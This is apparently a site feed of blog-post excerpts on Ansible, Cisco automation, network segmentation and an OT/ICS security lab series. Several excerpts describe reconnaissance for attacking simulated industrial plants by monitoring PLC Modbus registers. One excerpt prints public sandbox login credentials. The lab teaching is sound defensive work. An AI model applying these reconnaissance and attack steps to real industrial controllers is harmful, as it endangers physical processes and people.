necessary.\nSince the early 2000s, a standard feature has been available to achieve a similar outcome: Private VLAN, also known as port isolation, which allows devices to be segmented into port groups.\nPrivate VLAN Private VLANs are defined in RFC5517 as VLAN-based \u0026ldquo;forced forwarding.\u0026rdquo; In other words, frame forwarding is determined at the VLAN level.\nTwo types of VLANs are defined:\nPrimary VLAN: This VLAN handles traffic common to all groups. Secondary VLAN: This VLAN is associated with port groups and can be either Isolated or Community. In an Isolated VLAN, each port can communicate only with the primary VLAN. In a Community VLAN, each port can communicate with the primary VLAN and all ports within the same Community VLAN. There are three types of ports:\nPromiscuous Access Port (P-Port): This port can communicate with any other port, regardless of VLAN assignment. Host Isolated Access Port (I-Port): This port is associated with an Isolated VLAN and can only communicate with P-Ports. Host Community Access Port (C-Port): This port is associated with a Community VLAN and can communicate with P-Ports and all other C-Ports within the same VLAN. In a real-world environment, multiple interconnected switches would likely be present. Additionally, the network gateway is often a firewall that may not be VLAN-aware.\nFrom an operational standpoint, it is highly recommended to use switches of the same model and automate the PVLAN configuration to minimize human error.\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/04/30/industrial-network-segmentation-with-private-vlans/","title":"Industrial network segmentation with Private VLANs"},{"categories":["learning-paths","automation"],"contents":"Compared to VirtuaPlant, this scenario is more complex and allows us to explore potential attacks on a PLC in greater detail.\nReconnaissance Phase As done previously, we analyze the holding and coil registers:\n./modbus_monitor.py -i 172.26.104.32 -t holding ./modbus_monitor.py -i 172.26.104.32 -t coil Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/04/23/attacking-the-chemical-plant/","title":"Attacking the Chemical plant"},{"categories":["learning-paths","automation"],"contents":"Event-Driven Ansible (EDA) allows the execution of an Ansible playbook to be triggered by a specific event.\nThis capability exponentially increases Ansible\u0026rsquo;s potential, transforming it into a tool for automating processes based on specific events, such as troubleshooting, threat intelligence, IoCs, data collection, and general analysis. These activities can be partially or fully automated.\nMany security vendors have released specific modules. For instance, Palo Alto Networks has developed a plugin for analyzing firewall logs and triggering initial automated diagnostics in case of SSL decryption errors.\nRulebook An Ansible Rulebook is a set of rules that EDA uses to execute specific actions. A rulebook can:\nMonitor one or multiple sources . Contain one or multiple rules . Trigger one or multiple actions . The first part of a rulebook defines one or more event sources to be monitored. EDA uses Event Source Plugins to monitor these sources.\nEvent Source Plugins Event Source Plugins can be classified into three types:\nEvent Bus Plugins: Listens to a stream of events from a source where the connection is established by the plugin itself (e.g., Kafka and AWS SQS Queue plugins). Scraper Plugins: Connects to a source and scrapes data from it, usually at predefined intervals (e.g., URL Check and Watchdog plugins). Callback Plugins: Provides a callback endpoint that the event source can call when data is available (e.g., Webhook and Alertmanager plugins). Callback plugins are the least reliable as they depend on the event source to call the endpoint and are highly susceptible to data loss. When an Event Source Plugin detects an event, EDA uses rules to determine which action to take. If an event matches a rule, EDA executes the specified actions. Actions can include:\nrun_playbook: Executes an existing Ansible Playbook. run_job_template: Runs a job template via the Ansible Automation Platform. run_module: Runs a specific Ansible module for targeted execution without running an entire playbook. post_event: Posts an event to a running ruleset, allowing action results to feed back into EDA. set_fact: Stores specific event data to be reused within EDA. debug: Outputs debug information, similar to the debug module in Ansible Playbooks. Continue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2025/04/19/event-driven-ansible/","title":"Event-Driven Ansible"},{"categories":["learning-paths","automation"],"contents":"As we have seen, the GRFICSv2 simulator consists of four main components: HMI, PLC, Simulator, and EWS.\nIn a real-world ICS environment, the HMI, PLC, and Simulator are connected to the field network, where a gateway facilitates communication between the OT network and the field devices. The EWS (Engineering Workstation), on the other hand, is located within the OT network and communicates with the HMI and PLC through the router/gateway.\nWe can organize these components in a way that best suits our needs. The following instructions describe how to configure all components within the same OT network, similar to what we previously did with VirtuaPlant.\nThe communication between HMI, PLC, and the simulator uses the Modbus protocol. Unlike real-world systems, the HMI is implemented as a web-based interface. The EWS system, which is typically Windows-based, is represented here by a Linux system equipped with the OpenPLC SDK.\nThe complete scenario consists of four distinct VMs, although it is possible to run all components on the same Docker host.\nInstalling the Chemical Plant Container Before setting up the environment, ensure you have two Linux systems with Docker installed. I used the latest Ubuntu LTS version and followed the official Docker installation guide.\nOnce the systems are ready, install the PLC simulation container on the first machine using:\ndocker run --name simulation --rm -d -p 80:80 -p 5020:5020 -p 5021:5021 -p 5022:5022 -p 5023:5023 -p 5024:5024 -p 5025:5025 dainok/grficsv2-simulation:latest This command:\nDownloads and runs the latest Chemical Plant simulation container. Automatically removes the container when stopped (\u0026ndash;rm). Exposes ports: 80 (for the web interface), 502X (for Modbus communication with the PLC). After a few moments, you can access the simulator web interface by entering the host system\u0026rsquo;s IP address in a web browser using port 80.\nInstalling the PLC Container The PLC is implemented using OpenPLCv2. While a newer version of OpenPLC exists, the differences were too significant, so the only way to ensure compatibility was to retain this outdated version.\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/04/16/installing-the-grficsv2-chemical-plant/","title":"Installing the GRFICSv2 Chemical plant"},{"categories":["learning-paths","automation"],"contents":"By default, Ansible executes playbooks on a single host. However, in various scenarios, tasks need to be executed across multiple hosts in a specific sequence. A common example is a web server that must be taken offline from the load balancer before being modified. A typical playbook for this scenario would:\nReconfigure the load balancer to take the web server offline Reconfigure the web server Reconfigure the load balancer to bring the web server back online If we refer to our previously mentioned network fabric, we can adapt this approach:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2025/04/12/delegate-ansible-tasks-to-a-different-host/","title":"Delegate Ansible tasks to a different host"},{"categories":["learning-paths","automation"],"contents":" GRFICSv2 (Graphical Realism Framework for Industrial Control Simulations) is an Industrial Control Systems (ICS) simulator developed by Fortiphyd and released in 2020. Unlike VirtuaPlant, GRFICSv2 integrates an HMI, a PLC, and a simulation environment. The simulation emulates a chemical plant that is controlled and monitored by simulated remote I/O devices via a simple JSON API.\nOfficially Released Components The following components are distributed as OVA (Open Virtual Appliance) files compatible with VirtualBox :\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/04/09/an-ics-lab-with-grficsv2/","title":"An ICS lab with GRFICSv2"},{"categories":["learning-paths","automation"],"contents":"A more complex interactive task than those seen before is rebooting the device and waiting for it to be available again. Although Ansible is not designed specifically for this purpose, it can be useful, for example, in a procedure that updates device firmware.\nLet\u0026rsquo;s analyze the manual procedure:\nThe device must obviously be reachable. The configuration register should be set to 0x2101. The configuration must be saved. At this point, the reload command can be issued, followed by waiting for it to be reachable again before issuing further commands.\nThe preliminary tasks, which have already been analyzed before, can be implemented very simply:\nThe check of the register could have been done with a single task, but with significantly lower usability:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2025/04/05/reboot-a-device-with-ansible-and-wait-for-it-to-come-online/","title":"Reboot a device with Ansible and wait for it to come online"},{"categories":["learning-paths","automation"],"contents":"In real-world industrial environments, it is common to have all OT/ICS devices configured with IP addresses belonging to a single large network. This setup allows different production lines or plants to potentially communicate without any filtering.\nAdditionally, user PCs are often part of the same network for various purposes. Unfortunately, these PCs are more susceptible to malware due to inconsistent adherence to corporate policies. A malware infection within an OT/ICS network can easily spread due to weak security defenses.\nOur laboratory implements two different plants: the Bottle Filling Plant and the Oil Refinery Plant. In our setup, these two plants should not communicate with each other, even though they reside on the same IP network.\nThe goal is to segment the OT/ICS network transparently, minimizing disruptions.\nObservations after VLAN insertion implementation:\nNo IP address changes required Minimal downtime Increased network visibility Clear separation between IT and OT resources Ability to apply customized policies to different zones Capability for deep packet inspection on a per-zone basis Faster identification and isolation of potential issues Scalability up or down as needed Grouping OT/ICS Devices Without Reconfiguration Our laboratory includes the following devices:\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/04/02/industrial-network-segmentation-with-vlan-insertion/","title":"Industrial network segmentation with VLAN Insertion"},{"categories":["learning-paths","automation"],"contents":"We have already explored how to attack the Bottle Filling system. This article follows up on that analysis but in a significantly more complex scenario.\nReconnaissance phase The Bottle Filling system operated automatically. However, this system requires supervision by an operator who interacts with it via an HMI. Specifically, the operator determines when to transition from one processing phase to another.\nWe will analyze how the PLC registers change while interacting with the HMI.\nFor this purpose, I developed a small tool that continuously monitors Modbus registers to determine which ones are in use. The tool is available in my GitHub repository .\nWe acknowledge that a real attack would be much more complex, as the attacker does not have visual feedback from the HMI or the system itself.\nTo continuously monitor the PLC behavior, we execute:\n./modbus_monitor.py -i 172.26.104.22 -p 502 -t holding System Idle: when the system is idle, all registers report a value of 0.\nFilling Tank: as soon as the feed pump is activated, register 1 is set to 1. When the crude oil level reaches the sensor, register 1 returns to 0, and register 2 is set to 1.\nFrom this, we deduce:\nRegister 1: Actuator, defines the state of the feed pump (open/closed) Register 2: Sensor, detects if the tank is full (tank level sensor) Tank drainage: when the discharge valve is opened, register 2 remains unchanged, register 3 is set to 1, and registers 6 and 7 increment.\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/03/26/attacking-the-oil-refinery-plant/","title":"Attacking the Oil Refinery plant"},{"categories":["learning-paths","automation"],"contents":"Ansible AWX is the open-source version from which Ansible Tower draws inspiration. Both AWX and Tower are orchestrators for Ansible playbook\nAnsible AWX is the open-source version from which Ansible Tower draws inspiration. Both AWX and Tower are orchestrators for Ansible playbooks, allowing management of playbooks in the form of projects, credentials, schedules, and reports.\nThe installation of Ansible AWX is particularly complex and has changed multiple times over time. Currently, it requires a Kubernetes environment which we will install on an Ubuntu Linux Server system.\nTherefore, we need a system with the following specifications:\nUbuntu Linux Server 22.04 8 cores 8 GB of RAM 50 GB of disk space Docker First, we install Docker by following the official documentation .\nRemove any packages related to previous versions:\napt-get purge docker.io docker-doc docker-compose docker-compose-v2 podman-docker containerd runc Add the official Docker repository:\nwget -qO- https://download.docker.com/linux/ubuntu/gpg | apt-key add - add-apt-repository \u0026#34;deb [arch=$(dpkg --print-architecture)] https://download.docker.com/linux/ubuntu $(. /etc/os-release \u0026amp;amp;\u0026amp;amp; echo \u0026#34;$VERSION_CODENAME\u0026#34;) stable\u0026#34; Finally, install Docker:\napt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin Minikube Minikube allows us to have a complete instance of Kubernetes within a single virtual machine.\nSo, let\u0026rsquo;s install Minikube:\ncurl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 install minikube-linux-amd64 /usr/local/bin/minikube \u0026amp;amp;\u0026amp;amp; rm minikube-linux-amd64 Then, with an unprivileged user but belonging to the docker group, we create the Kubernetes instance:\nminikube start --cpus=4 --memory=6g --addons=ingress minikube kubectl -- get nodes For simplicity, let\u0026rsquo;s add an alias that allows us to use the kubectl command:\nalias kubectl=\u0026#34;minikube kubectl --\u0026#34; Installing AWX Check the AWX Operator repository to see which tag we can use (2.16.1) and create the necessary files for the environment setup:\nThen apply the changes:\nkubectl apply -k awx/ Monitor the pod creation with the following command and wait for it to finish:\nkubectl get pods -n awx -w Then create the resource file:\nAnd associate it with the previously created file:\nThen apply the changes:\nkubectl apply -k awx/ Continue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2025/03/22/orchestrating-playbooks-with-ansible-awx/","title":"Orchestrating playbooks with Ansible AWX"},{"categories":["learning-paths","automation"],"contents":"Originally, VirtuaPlant included only one scenario, but later, an external contributor ( GitHub user prjpet ) added an additional scenario, further expanding its capabilities.\nhe simulation and HMI communicate using the Modbus protocol. The simulation acts as a basic PLC, handling both control logic and plant visualization.\nBoth the simulation and HMI are graphical applications developed in Python 2.7 using the Pygame library. Since they rely on Linux-based systems, both components must be run on Linux machines.\nInstalling the Simulation (PLC) Container Before installing the scenario, ensure you have two Linux systems with Docker installed. I used the latest Ubuntu LTS version and followed the official Docker installation guide . Once the systems are ready, install the PLC simulation container on the first machine using:\ndocker run --name plc --rm -d -p 443:6901 -p 502:5020 -e VNC_PW=password dainok/virtuaplant-oil-refinery-plc:22 Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/03/19/installing-virtuaplant-oil-refinery-plant/","title":"Installing VirtuaPlant Oil Refinery plant"},{"categories":["learning-paths","automation"],"contents":"Ansible provides Galaxy, which allows managing packages containing roles and collections. Roles and collections can be directly referenced by Ansible playbooks. Galaxy enables the use of packages published directly on the public portal but also allows managing private repositories.\nIn this post, we will focus on the official Galaxy portal . The Galaxy portal is fully integrated with GitHub, where various repositories available as collections in Galaxy are stored.\nThe structure of a collection is quite rigid, and to create one, it is best to rely on ansible-creator, which we can install using pip:\npip install ansible-creator We then create a collection using the format github_nickname.collection_name. In my case, I used dainok.courses :\nansible-creator init collection dainok.courses This command creates a complete but rather complex structure:\nLet\u0026rsquo;s examine the essential parts.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2025/03/16/ansible-galaxy/","title":"Ansible Galaxy"},{"categories":["learning-paths","automation"],"contents":"This scenario serves as an introduction to attacking a Modbus-based PLC. The goal is to gradually understand the system\u0026rsquo;s behavior by monitoring the PLC registers before executing an attack.\nReconnaissance phase Before launching an attack, it is crucial to analyze the plant\u0026rsquo;s behavior. This involves monitoring the PLC registers to identify active ones and understand how they are utilized.\nFor this purpose, I developed a small tool that continuously monitors Modbus registers to determine which ones are in use. The tool is available in my GitHub repository .\nTo monitor the PLC behavior for 15 seconds, execute:\n./modbus_monitor.py -i 172.26.104.12 -p 502 -t holding -k 15 From our observations, only holding registers are used, specifically registers 1, 2, 3, 4, and 16. Notably, register 16 holds a value of 1, warranting further investigation.\nWe also identified that these registers store binary information (0 or 1), despite Modbus offering dedicated boolean registers for this purpose.\nThe system operates in three phases:\nInitialization: The conveyor moves the first bottle under the nozzle. Filling: The nozzle opens, filling the bottle. Moving: The conveyor moves the next bottle into position. This cycle repeats indefinitely. During a real-world attack, the adversary would likely lack physical visibility of the system\u0026rsquo;s operation. However, for this lab, we simplify the analysis.\nFrom the three phases described above, we can observe:\nSensors: Used to read the state of the plant. There are two sensors: bottle presence and full bottle. Actuators: Used to alter the state of the plant. There are three actuators: roller and nozzle. After observing the plant behavior and associated states for a certain period, we can define that:\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/03/12/attacking-the-bottle-filling-plant/","title":"Attacking the Bottle Filling plant"},{"categories":["learning-paths","automation"],"contents":"ARA Records Ansible provides a simple dashboard to visualize the execution of Ansible playbooks. It is not an orchestration tool but rather\nARA Records Ansible provides a simple dashboard to visualize the execution of Ansible playbooks. It is not an orchestration tool but rather a reporting tool that facilitates visualization and troubleshooting.\nARA works with any Ansible playbook, regardless of how it is executed. Therefore, ARA can be integrated with other tools. However, the information stored by ARA can be enhanced by integrating playbooks with specific parameters.\nTo better understand ARA, we can explore the demo .\nBy configuring ARA as a callback, playbook execution results are stored in a database:\nInstalling and Configuring ARA ARA is installed as a Python module:\npip install ara[server] We then need to configure ARA as a callback. To do this, we run the following command:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2025/03/09/ansible-reporting-with-ara/","title":"Ansible reporting with ARA"},{"categories":["learning-paths","automation"],"contents":"The first scenario available in VirtuaPlant simulates a basic bottle-filling plant. This scenario includes a graphical Human-Machine Interface (HMI) that allows users to interact with the simulated industrial process.\nThe simulation and HMI communicate using the Modbus protocol. The simulation acts as a basic PLC, handling both control logic and plant visualization.\nBoth the simulation and HMI are graphical applications developed in Python 2.7 using the Pygame library. Since they rely on Linux-based systems, both components must be run on Linux machines.\nInstalling the Simulation (PLC) Container Before installing the scenario, ensure you have two Linux systems with Docker installed. I used the latest Ubuntu LTS version and followed the official Docker installation guide . Once the systems are ready, install the PLC simulation container on the first machine using:\ndocker run --name plc --rm -d -p 443:6901 -p 502:5020 -e VNC_PW=password dainok/virtuaplant-bottle-filling-plc:latest Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/03/05/installing-virtuaplant-bottle-filling-plant/","title":"Installing VirtuaPlant Bottle Filling plant"},{"categories":["learning-paths","automation"],"contents":"The network infrastructure that EVE-NG uses to interconnect lab nodes is somewhat obscure. Let\u0026rsquo;s explore how to identify the Linux interfaces of each virtualized node for debugging or simple analysis.\nLet\u0026rsquo;s take the following lab as an example:\nRequired Information Before we begin, we need the following data:\nUser identifier (POD) Lab identifier Node identifiers to analyze Interface identifiers to analyze Network identifiers to analyze Execution space identifier User Identifier (POD) The user identifier is visible to an administrator under Management -\u0026gt; User Management.\nIn this example, the POD assigned to my user is 5.\nLab Identifier The lab identifier can be found by opening the lab and navigating to Lab Details.\nFor instance, my lab identifier is 3b327c21-1585-499d-9a0d-4281e05f4532.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/eve-ng.webp","permalink":"https://www.adainese.it/blog/2025/03/02/eve-ng-network-interfaces-explained/","title":"EVE-NG network interfaces explained"},{"categories":["learning-paths","automation"],"contents":"Some commands, before becoming operational, ask for confirmation from the operator. Ansible has a basic capability to handle these situations thanks to the cli_command and ios_command modules. The first one is generic, the second one is specific to Cisco IOS systems, but both essentially perform the same function with some peculiarities and limitations. In general, vendor-specific modules should handle syntax errors correctly, but as we will see later, this is not always true.\nLet\u0026rsquo;s see some examples based on the \u0026ldquo;Simple Network Lab\u0026rdquo; laboratory.\nResetting Interface Counters The first example we see concerns resetting interface counters. The command requires a simple confirmation:\nWe can use cli_command to execute the command and respond to the confirmation. We refer to the official documentation :\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2025/03/01/managing-cli-prompts-with-ansible/","title":"Managing CLI prompts with Ansible"},{"categories":["learning-paths","automation"],"contents":" VirtuaPlant is an Industrial Control Systems (ICS) simulator developed by Jan Seidl in 2015. Unlike most PLC simulators, which only allow reading and writing tags, VirtuaPlant introduces real-world-like control logic, making it a more advanced and interactive learning tool.\nBy leveraging a game library and a 2D physics engine, VirtuaPlant provides a graphical user interface (GUI) that simulates the physical world behind the control system. This approach helps users visualize industrial processes and understand how control systems interact with real-world mechanics.\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/02/26/an-ics-lab-with-virtuaplant/","title":"An ICS lab with VirtuaPlant"},{"categories":["learning-paths","automation"],"contents":"Modbus is a widely used industrial communication protocol originally developed by Modicon (now part of Schneider Electric) in 1979. It is open, royalty-free, and simple to implement, making it one of the most popular protocols for connecting Programmable Logic Controllers (PLCs), Remote Terminal Units (RTUs), sensors, and other industrial devices.\nModbus is primarily used for data exchange in supervisory control and data acquisition (SCADA) systems and distributed control systems (DCS). The protocol is designed for high reliability and deterministic communication, which is essential in industrial automation environments.\nModbus Protocol Overview Modbus operates using a master-slave (or client-server) architecture, where:\nThe Master (Client) initiates requests, reading from or writing to devices. The Slaves (Servers) respond to the requests but do not initiate communication independently. A master device (such as an HMI or SCADA system) communicates with one or more slave devices (such as PLCs, RTUs, or field devices) over a network. Each slave is assigned a unique 8-bit address (ranging from 1 to 247 in RTU mode). Modbus RTU (Remote Terminal Unit) is usually used via RS-485 (serial network).\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/02/19/introduction-to-modbus-protocol/","title":"Introduction to Modbus protocol"},{"categories":["learning-paths","automation"],"contents":"Operational Technology (OT) encompasses the systems responsible for monitoring and controlling industrial operations. Within OT, **Industrial Control Systems (ICS)** refer specifically to technologies used for automating and managing industrial processes.\nWhile IT professionals have decades of experience securing networks, systems, and applications, cybersecurity in OT/ICS is a relatively new concern. In industrial environments, **availability takes priority over integrity and confidentiality**, meaning that ICS software is often designed for speed and efficiency rather than security. This fundamental difference makes OT/ICS systems uniquely vulnerable to cyber threats.\nOT (Operational Technology) Operational Technology (OT) refers to the hardware and software used to monitor, control, and automate industrial processes, critical infrastructure, and manufacturing plants. OT is distinct from IT (Information Technology) because its primary focus is on ensuring operational continuity and physical safety, whereas IT is concerned with data management and cybersecurity.\nKey OT Components:\nIndustrial Control Systems (ICS) Sensors and Actuators Supervisory and Control Systems (SCADA, DCS) Embedded Devices (PLC, RTU) Industrial Networks (Industrial Ethernet, MODBUS, Profibus, etc.) ICS (Industrial Control Systems) Industrial Control Systems (ICS) are a subset of OT that includes all technologies used to monitor and control automated industrial processes. ICS are deployed in manufacturing, energy, transportation, utilities, and other critical industries to ensure safe and efficient operations.\nTypes of ICS:\nSCADA (Supervisory Control and Data Acquisition) DCS (Distributed Control System) PLC (Programmable Logic Controller) RTU (Remote Terminal Unit) Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/02/12/introduction-to-ot/ics/","title":"Introduction to OT/ICS"},{"categories":["learning-paths","automation"],"contents":"In every company I\u0026rsquo;ve encountered, documentation is a recurring challenge. It\u0026rsquo;s a complex topic: creating documentation is labor-intensive, but keeping it up to date is even more demanding. This often leads to outdated or non-existent documentation.\nFor years, I\u0026rsquo;ve worked on improving documentation processes. My approach focuses on enhancing tools to make them more efficient and incorporating automation. In many cases, documentation can be derived directly from infrastructure, minimizing manual data collection and allowing people to focus on analysis, commentary, and summarization.\nWhile it might seem like a small detail, I believe a different approach to documentation could bring significant benefits to organizations.\nWhat makes great documentation? No matter what platform a company uses, it should support all types of documentation: process, technical, or compliance. Choosing the right tool requires considering the needs of all teams. I recommend the following key features:\nExport to PDF. Support for macros, even complex ones. Integration with APIs. Metadata for each document: author, date, confidentiality level. Why I avoid traditional word processors The most commonly used tool for writing documents is Microsoft Word. In some cases, I\u0026rsquo;ve also seen LibreOffice or Wiki-style collaborative systems.\nMicrosoft Word is undoubtedly powerful, offering countless features. However, its complexity often results in these features being underutilized.\nPersonally, I avoid traditional word processors for several reasons:\nIncompatible with version control: Their binary data structure doesn\u0026rsquo;t work well with tools like Git. Mixing layout and content: Formatting and content are intertwined, complicating workflows. Inconsistent layouts: Achieving uniform formatting can be unnecessarily time-consuming. I find the combination of content creation and formatting to be inefficient. Authors should focus on writing, not how their text looks, to save valuable time.\nNot everything needs to be documented Over-documentation often highlights deeper process issues. Here are key points for organizations to consider:\nBase skills: Employees should have fundamental skills. Documentation isn\u0026rsquo;t a substitute for basic training. Documentation ≠ Reporting: Documentation should be concise and essential for the company\u0026rsquo;s operations, unlike extensive reports. Readability: Hundreds of unreadable pages are a waste of time. Keep it simple and practical. Regular updates: Allocate time for maintaining and updating documentation. Standardization over Customization: If every product requires unique documentation, consider standardizing products instead of creating endless variations. Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/02/05/simplifying-documentation-with-markdown-and-ci/cd/","title":"Simplifying documentation with Markdown and CI/CD"},{"categories":["learning-paths","automation"],"contents":"In today\u0026rsquo;s interconnected world, securing and understanding Operational Technology (OT) and Industrial Control Systems (ICS) is more important than ever. This series of posts explores hands-on lab setups, security best practices, and key learning resources to help you build, test, and protect critical infrastructure. Whether you\u0026rsquo;re just starting or looking to deepen your expertise, these posts will provide valuable insights into the evolving OT/ICS landscape.\nIntroduction to OT/ICS Introduction to Modbus protocol Building OT/ICS Cybersecurity labs Learn how to build your own OT/ICS cybersecurity lab for hands-on testing, training, and research. This guide covers essential hardware, software, and network setups to simulate real-world industrial environments, helping you develop and refine your security skills in a safe, controlled setting.\nWhy build an OT/ICS Cybersecurity lab? An ICS lab with VirtuaPlant Installing VirtuaPlant Bottle Filling plant Attacking the Bottle Filling plant Installing VirtuaPlant Oil Refinery plant Attacking the Oil Refinery plant (paid memebers only) An ICS lab with GRFICSv2 Installing the GRFICSv2 Chemical plant Attacking the Chemical plant An ICS lab with Factory I/O Installing a Factory I/O based plant Attacking a Factory I/O based plant Visibility, observability, and segregation in OT/ICS Visibility and observability are critical for securing and managing industrial OT/ICS environments. Visibility ensures that all assets, communications, and network activities are identified, while observability provides deeper insights into system behaviors, anomalies, and potential threats. Effective segregation of OT/ICS networks using VLANs, firewalls, and air-gapping minimizes the attack surface by isolating critical systems from IT and external networks. This layered approach enhances security, reduces operational risks, and ensures compliance with industry regulations.\nIndustrial network segmentation with VLAN Insertion Industrial network segmentation with Private VLANs (to be released on 2025-04-30) OT/ICS visibility with Palo Alto Networks OT/ICS visibility with Cisco Cyber Vision Secure remote maintenance with Cisco Secure Equipment Access Edge computing with Cisco IOx Get Started Today Join us on this journey and gain the knowledge to stay ahead in the evolving OT/ICS landscape!\nIf you found this information useful, consider supporting us on Patreon for more in-depth guides and tutorials.\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/01/29/ot/ics-series/","title":"OT/ICS series"},{"categories":["learning-paths","automation"],"contents":"For several years now, I have been deeply interested in the security challenges of Industrial Control Systems (ICS) and Operational Technology (OT). Living in a region renowned for its manufacturing excellence, many of my clients operate in this domain. This proximity has allowed me to witness firsthand the evolving landscape of ICS/OT security.\nWhen I first started discussing the application of cybersecurity to ICS/OT systems, I quickly realized I was ahead of the curve. At the time, the primary focus for ICS/OT environments was ensuring operational continuity. OT managers were more concerned with uptime, process efficiency, and reliability than the potential risks posed by cyber threats.\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/01/29/why-build-an-ot/ics-cybersecurity-lab/","title":"Why build an OT/ICS Cybersecurity lab?"},{"categories":["learning-paths","automation"],"contents":"This article stems from a colleague\u0026rsquo;s request to automate the configuration compliance checks for hundreds of switches spread across the globe.\nIntroduction Ensuring configuration compliance is essential for:\nVerifying that devices meet expected configurations. Detecting unauthorized changes (out-of-process modifications). Measuring compliance levels. In this guide, we\u0026rsquo;ll outline an integration that uses templates to check device configurations and generate reports with:\nA list of ports reviewed, showing their compliance status. A summary of the number of compliant and non-compliant ports per device. We\u0026rsquo;ll focus on readability rather than advanced code optimization.\nUsing Catalyst Center Our scenario assumes all devices are managed via Cisco Catalyst Center (formerly Cisco DNA Center). If you don\u0026rsquo;t have a local instance, you can use the sandbox environment available at sandboxdnac2.cisco.com with the credentials:\nUser: devnetuser Password: Cisco123! If we navigate to Provision → Inventory, we get a list of managed devices:\nClicking on a device opens a small popup that lets us access its detailed page:\nBy going to Interfaces → Ethernet Ports → GigabitEthernet1/0/4, we can view the interface details:\nWe can see that the window displays some information, but it is rather limited.\nNext, let\u0026rsquo;s navigate to Configuration to check the interface configuration:\nFrom this, we can draw some initial conclusions:\nCatalyst Center contains the configurations (running-config) for all our devices. Catalyst Center provides high-level information about interface configurations, but details (e.g., STP, Port Security, QoS) are only accessible by examining the running-config. This situation arises because we are still heavily reliant on the CLI for managing switches. It\u0026rsquo;s fair to say that these devices are CLI-first. Orchestrators like Catalyst Center tend to provide a limited view, leaving the CLI as the primary tool for accessing detailed information.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/cisco.webp","permalink":"https://www.adainese.it/blog/2025/01/22/automating-configuration-compliance-verification-for-cisco-switches/","title":"Automating configuration compliance verification for Cisco Switches"},{"categories":["learning-paths","automation"],"contents":"Welcome to our series on Cisco Automation Solutions! In this series, we\u0026rsquo;ll explore how Cisco\u0026rsquo;s powerful tools and technologies, like Catalys\nWelcome to our series on Cisco Automation Solutions! In this series, we\u0026rsquo;ll explore how Cisco\u0026rsquo;s powerful tools and technologies, like Catalyst Center, APIs, and SDKs, can help automate network management, optimize configurations, and improve device monitoring. From simplifying complex tasks to ensuring compliance, Cisco\u0026rsquo;s automation capabilities can streamline your IT infrastructure and boost efficiency.\nWe\u0026rsquo;ll start with the fundamentals, then dive into advanced strategies with hands-on examples and best practices. Whether you\u0026rsquo;re new to automation or looking to elevate your skills, this series has something for everyone.\nJoin us as we unlock the power of Cisco automation and transform the way you manage your network!\nCisco ACI automation posts This section is dedicated to Cisco ACI, Cisco\u0026rsquo;s flagship SDN solution for data centers. Here you\u0026rsquo;ll find articles that explain its architecture, demonstrate how to automate tasks using its powerful API-first design, and guide you through real-world use cases to make the most of your ACI deployment.\n01. Introduction to Cisco ACI 02. Setting up a Cisco ACI lab environment 03. Operating with Cisco ACI 04. Cisco ACI object model explained 05. Logging into Cisco ACI 06. From Single-Site to Multi-Site with NDO 07. Circular Dependencies with NDO 08. Frameworks for Projects with Cisco ACI and NDO (released on 12/10/2025) 09. Simplifying the Data Structure 10. Managing Cisco NDO Limitations from the APIC (released on 26/10/2025) 11. A practical Cisco NDO multi-site use case: modelling (released on 02/11/2025) 12. A practical Cisco NDO multi-site use case: additional configuration (released on 09/11/2025) 13. A practical Cisco NDO multi-site use case: data validation (released on 16/11/2025) 14. A practical Cisco NDO multi-site use case: building the parser (released on 23/11/2025) 15. A practical Cisco NDO multi-site use case: config deploy (released on 30/11/2025) Other posts about Cisco equipments In this section, we focus on automation beyond the data center, covering tools and strategies for campus networks, switches, and routers. You\u0026rsquo;ll find practical automation examples that help ensure consistency, improve uptime, and simplify ongoing operations.\nAutomating configuration compliance verification for Cisco Switches Get Started Today By joining this Patreon series, you\u0026rsquo;ll unlock exclusive content focused on mastering Ansible for network automation. Dive into detailed tutorials and real-world use cases that will help you streamline your network configurations and automate complex tasks with ease. Stay ahead of the curve with practical insights and hands-on experience that will transform your approach to network management.\nIf you found this information useful, consider supporting us on Patreon for more in-depth guides and 